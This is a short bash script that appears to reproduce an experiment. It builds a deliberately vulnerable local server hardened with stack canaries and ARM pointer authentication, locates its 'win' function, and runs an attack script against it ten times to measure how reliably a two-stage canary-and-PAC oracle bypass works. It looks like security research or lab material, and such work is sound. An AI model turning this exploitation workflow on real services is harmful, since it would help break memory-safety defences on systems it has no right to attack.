#!/bin/bash
# One-click reproduction of the canary + PAC two-stage oracle (10 trials).
set -u
ROOT=$(cd "$(dirname "$0")" && pwd)
BIN=$ROOT/server_canary
ATT=$ROOT/attack_canary.py
RES=$ROOT/results
mkdir -p "$RES"

gcc -O0 -g -fno-omit-frame-pointer -fstack-protector-strong \
  -no-pie -static -mbranch-protection=pac-ret+bti \
  -o "$BIN" "$ROOT/server_canary.c" || exit 1
WIN=$(nm "$BIN" | awk '/ win$/{print $1}')
echo "win=0x$WIN"

succ=0
for t in $(seq 1 10); do
  port=$((12000 + t))
  "$BIN" "$port" >"$RES/repro-server-$t.log" 2>&1 &
  pid=$!
  sleep 0.3
  timeout 120 python3 "$ATT" "$port" "0x$WIN" >"$RES/repro-attack-$t.log" 2>&1
  rc=$?
  if [ "$rc" -eq 0 ]; then succ=$((succ + 1)); fi
  kill "$pid" 2>/dev/null || true
  pkill -f "server_canary $port" 2>/dev/null || true
  sleep 0.1
done
echo "success=$succ/10"
[ "$succ" -eq 10 ]
